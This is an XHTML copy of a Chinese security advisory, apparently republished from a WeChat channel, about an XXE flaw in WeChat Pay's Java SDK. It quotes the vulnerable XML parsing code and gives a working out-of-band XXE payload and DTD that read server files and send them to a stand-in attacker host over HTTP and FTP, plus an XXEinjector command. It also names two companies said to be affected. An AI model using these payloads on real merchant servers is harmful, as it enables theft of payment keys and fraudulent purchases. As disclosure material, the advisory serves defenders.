@@ -1,0 +1,119 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>漏洞预警 | 微信支付SDK存在XXE漏洞</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>漏洞预警 | 微信支付SDK存在XXE漏洞</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247484013&amp;idx=1&amp;sn=a79490e2570bf11516e132615b381e0b&amp;chksm=fa3942b7cd4ecba1e51136e7acaaf950035b3ffd84ff9fe937514ab4a94deded4f0bf3b8d0e9&amp;scene=126&amp;sessionid=1681376547#rd">http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247484013&amp;idx=1&amp;sn=a79490e2570bf11516e132615b381e0b&amp;chksm=fa3942b7cd4ecba1e51136e7acaaf950035b3ffd84ff9fe937514ab4a94deded4f0bf3b8d0e9&amp;scene=126&amp;sessionid=1681376547#rd</a></blockquote><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-right: 0%;margin-bottom: 10px;margin-left: 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;vertical-align: top;border-style: solid;border-width: 2px;border-radius: 0px;border-color: rgb(80, 162, 238);padding: 15px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="box-sizing: border-box;"><section class="" style="font-size: 15px;color: rgb(40, 40, 40);text-align: center;box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 15px;">更多全球网络安全资讯尽在邑安全</span></p><p style="box-sizing: border-box;"><span style="box-sizing: border-box;font-size: 15px;">www.eansec.com</span></p></section></section></section></section></section></section></section><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><p style=" margin-bottom: 24px;box-sizing: border-box;color: rgb(51, 51, 51) ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><span style="font-size: 15px;">漏洞信息来源：<br style="box-sizing: border-box;"/></span><span style="font-size: 15px;">http://seclists.org/fulldisclosure/2018/Jul/3</span></p><blockquote style=" padding-right: 15px;padding-left: 15px;margin-bottom: 24px;border-left-width: 4px;border-left-color: rgb(221, 221, 221);box-sizing: border-box;color: rgb(119, 119, 119) ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><p style="font-size: 17.5px;line-height: 1.25;box-sizing: border-box;"><span style="font-size: 15px;"><strong style="box-sizing: border-box;">受影响版本：</strong><br style="box-sizing: border-box;"/>JAVA SDK，WxPayAPI_JAVA_v3，建议使用了该版本的公司<strong style="box-sizing: border-box;">进行异常支付排查</strong>。</span></p></blockquote><p style=" margin-bottom: 24px;box-sizing: border-box;color: rgb(51, 51, 51) ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><span style="font-size: 15px;"/></p><p><img class="" data-copyright="0" data-ratio="0.38345864661654133" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8sfNuz6Q1uFDKKnxIzmeiav05LKykU9essQMUz48ULawTlqAttwseeBUfuFyMtaIGpeVNhQIncWZfA/640?wx_fmt=jpeg" data-type="jpeg" data-w="532" style="" src="../Images/af9cc089933b5597d7027f03602fb19b.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8sfNuz6Q1uFDKKnxIzmeiav05LKykU9essQMUz48ULawTlqAttwseeBUfuFyMtaIGpeVNhQIncWZfA/640?wx_fmt=jpeg"/></p><p style=" margin-bottom: 24px;box-sizing: border-box;color: rgb(51, 51, 51) ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><span style="font-size: 15px;"/><br/></p><p style=" margin-bottom: 24px;box-sizing: border-box;color: rgb(51, 51, 51) ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><span style="font-size: 15px;">微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何信息。一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品）</span></p><h3 style=" margin-top: 1em;margin-bottom: 16px ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><span style="font-size: 15px;">漏洞详情</span></h3><pre style=" padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code style="  ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><span style="font-size: 15px;">The SDK  in this page:  https://pay.weixin.qq.com/wiki/doc/api/jsapi.php
+chapter=11_1
+   Just in java vision:
+https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip
+    or
+https://drive.google.com/file/d/1AoxfkxD7Kokl0uqILaqTnGAXSUR1o6ud/view(
+Backup ）
+
+
+   README.md in  WxPayApi_JAVA_v3.zip,it show more details:
+
+   notify code example:
+    [
+        String notifyData = "....";
+        MyConfig config = new MyConfig();
+        WXPay wxpay = new WXPay(config);
+//conver to map
+        Map&lt;String, String&gt; notifyMap = WXPayUtil.xmlToMap(notifyData);
+
+        if (wxpay.isPayResultNotifySignatureValid(notifyMap)) {
+//do business logic
+        }
+        else {
+         }
+
+     ]
+    WXPayUtil source code
+   [
+
+  public static Map&lt;String, String&gt; xmlToMap(String strXML) throws
+Exception {
+    try {
+            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();
+            /*** not disabled xxe *****/
+            //start parse
+
+            DocumentBuilderFactory documentBuilderFactory =
+DocumentBuilderFactory.newInstance();
+            DocumentBuilder documentBuilder =
+documentBuilderFactory.newDocumentBuilder();
+            InputStream stream = new ByteArrayInputStream(strXML.getBytes(
+"UTF-8"));
+            org.w3c.dom.Document doc = documentBuilder.parse(stream);
+
+           //end parse
+
+
+            doc.getDocumentElement().normalize();
+            NodeList nodeList = doc.getDocumentElement().getChildNodes();
+            for (int idx = 0; idx &lt; nodeList.getLength(); ++idx) {
+                Node node = nodeList.item(idx);
+                if (node.getNodeType() == Node.ELEMENT_NODE) {
+                    org.w3c.dom.Element element = (org.w3c.dom.Element) node
+;
+                    data.put(element.getNodeName(), element.getTextContent
+());
+                }
+            }
+            try {
+                stream.close();
+            } catch (Exception ex) {
+                // do nothing
+            }
+            return data;
+        } catch (Exception ex) {
+            WXPayUtil.getLogger().warn("Invalid XML, can not convert to
+map. Error message: {}. XML content: {}", ex.getMessage(), strXML);
+            throw ex;
+        }
+    }
+
+]</span></code></pre><h3 style=" margin-top: 1em;margin-bottom: 16px ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><span style="font-size: 15px;">利用细节</span></h3><pre style=" padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code style="  ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><span style="font-size: 15px;">Post merchant notification url with  payload:
+
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % attack SYSTEM "file:///etc/"&gt;
+  &lt;!ENTITY % xxe SYSTEM "http://attacker:8080/shell/data.dtd";&gt;
+  %xxe;
+]&gt;
+
+data.dtd:
+
+&lt;!ENTITY % shell "&lt;!ENTITY % upload SYSTEM 'ftp://attack:33/%attack;
+'&gt;"&gt;
+%shell;
+%upload;
+
+or use  XXEinjector tool  【https://github.com/enjoiz/XXEinjector】
+
+ruby XXEinjector.rb --host=attacker --path=/etc   --file=req.txt --ssl
+
+req.txt :
+POST merchant_notification_url HTTP/1.1
+Host:  merchant_notification_url_host
+User-Agent: curl/7.43.0
+Accept: */*
+Content-Length: 57
+Content-Type: application/x-www-form-urlencoded
+
+XXEINJECT
+
+
+In order to prove this, I got 2 chinese famous company:
+   a、momo: Well-known chat tools like WeChat
+   b、vivo ：China's famous mobile phone,that also famous in my country</span></code></pre><section class="" style="margin-top: 10px;margin-bottom: 10px;box-sizing: border-box;text-align: center;"><span style="color: rgb(80, 162, 238);font-size: 15px;">欢迎收藏并分享朋友圈，让五邑人网络更安全<br/></span></section><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.9955357142857143" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8tD9ic928O6vIrMg4fuib48e1TsRj9K9Cz7RZBD2jjVZcKm1N4QrZ4bwBKZic5crOdItOcdDicPd3yBSg/640?wx_fmt=jpeg" data-type="jpeg" data-w="224" style="width: 157px;height: 156px;" src="../Images/f991b2ae7d17500c856a541522a74428.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/1N39PtINn8tD9ic928O6vIrMg4fuib48e1TsRj9K9Cz7RZBD2jjVZcKm1N4QrZ4bwBKZic5crOdItOcdDicPd3yBSg/640?wx_fmt=jpeg"/></p><section class="" style="margin-top: 10px;margin-bottom: 10px;box-sizing: border-box;text-align: center;"><span style="color: rgb(80, 162, 238);font-size: 15px;">欢迎扫描关注我们，及时了解最新安全动态、学习最潮流的安全姿势！<br/></span></section><section style="background-color: rgb(255, 255, 255);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-top: 0.5em;box-sizing: border-box;"><section class="" style="height: 1px;background-color: rgb(95, 156, 239);box-sizing: border-box;"/><section class="" style="margin-top: 0.3em;margin-bottom: 0.3em;height: 3px;background-color: rgb(95, 156, 239);box-sizing: border-box;"/><section class="" style="border-width: 1px;border-style: solid;box-shadow: rgb(226, 226, 226) 0px 16px 1px -13px;border-color: rgb(95, 156, 239);padding: 0.5em;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 10px 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;vertical-align: top;background-color: rgb(247, 247, 247);padding-top: 10px;padding-bottom: 10px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin-right: 0%;margin-bottom: 10px;margin-left: 0%;box-sizing: border-box;"><section class="" style="display: inline-block;width: 100%;border-style: solid;border-width: 0px 0px 0px 6px;padding-right: 6px;padding-left: 6px;border-left: 6px solid rgb(80, 162, 238);border-right: 0px solid rgb(80, 162, 238);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="box-sizing: border-box;"><section class="" style="box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 15px;">推荐文章</span></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="text-align: center;box-sizing: border-box;"><section class="" style="display: inline-table;border-collapse: collapse;table-layout: fixed;width: 95%;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="display: table-row;width: 100%;box-sizing: border-box;"><section class="" style="display: table-cell;vertical-align: top;width: 10%;border-width: 1px;border-radius: 0px;border-style: none;border-color: rgb(62, 62, 62);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 6px 0%;font-size: 8px;box-sizing: border-box;"><section class="" style="display: inline-block;border-width: 2px;border-style: dotted;border-color: rgba(248, 248, 248, 0);width: 1.6em;height: 1.6em;border-radius: 0.3em;font-size: 12px;line-height: 1.5em;color: rgb(255, 255, 255);background-color: rgb(95, 156, 239);box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 15px;">1</span></p></section></section></section></section><section class="" style="display: table-cell;vertical-align: top;width: 90%;border-style: none;border-width: 1px;border-radius: 0px;border-color: rgb(62, 62, 62);padding-left: 6px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 5px 0%;box-sizing: border-box;"><section class="" style="text-align: justify;padding-right: 5px;padding-left: 5px;font-size: 14px;line-height: 1.8;box-sizing: border-box;"><p style="white-space: normal;box-sizing: border-box;"><a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247483671&amp;idx=1&amp;sn=5392d3c543eff0903b5e3871b97fe917&amp;chksm=fa3941cdcd4ec8db0b769837d404395ed87f23dbe56161717b02265a40f23d955b7cce55fbf2&amp;scene=21#wechat_redirect" target="_blank" style="text-decoration: underline;font-size: 15px;"><span style="font-size: 15px;">Django入门之旅-启程</span></a></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="display: table-row;width: 100%;box-sizing: border-box;"><section class="" style="display: table-cell;vertical-align: top;width: 10%;border-width: 1px;border-radius: 0px;border-style: none;border-color: rgb(62, 62, 62);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 6px 0%;font-size: 8px;box-sizing: border-box;"><section class="" style="display: inline-block;border-width: 2px;border-style: dotted;border-color: rgba(248, 248, 248, 0);width: 1.6em;height: 1.6em;border-radius: 0.3em;font-size: 12px;line-height: 1.5em;color: rgb(255, 255, 255);background-color: rgb(95, 156, 239);box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 15px;">2</span></p></section></section></section></section><section class="" style="display: table-cell;vertical-align: top;width: 90%;border-style: none;border-width: 1px;border-radius: 0px;border-color: rgb(62, 62, 62);padding-left: 6px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 5px 0%;box-sizing: border-box;"><section class="" style="text-align: justify;padding-right: 5px;padding-left: 5px;font-size: 14px;line-height: 1.8;box-sizing: border-box;"><p style="white-space: normal;box-sizing: border-box;"><a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247483652&amp;idx=1&amp;sn=b2f2ec90db499e23cfa252e9ee743265&amp;chksm=fa3941decd4ec8c83a268c3480c354a621d515262bcbb5f35e1a2dde8c828bdc7b9011cb5072&amp;scene=21#wechat_redirect" target="_blank" style="text-decoration: underline;font-size: 15px;"><span style="font-size: 15px;">重大漏洞预警：ubuntu最新版本存在本地提权漏洞（已有EXP）　</span></a></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"/></section></section></section></section></section></section></section></section></section></section></section></section><p><br/></p>
+        
+</body>
+</html>
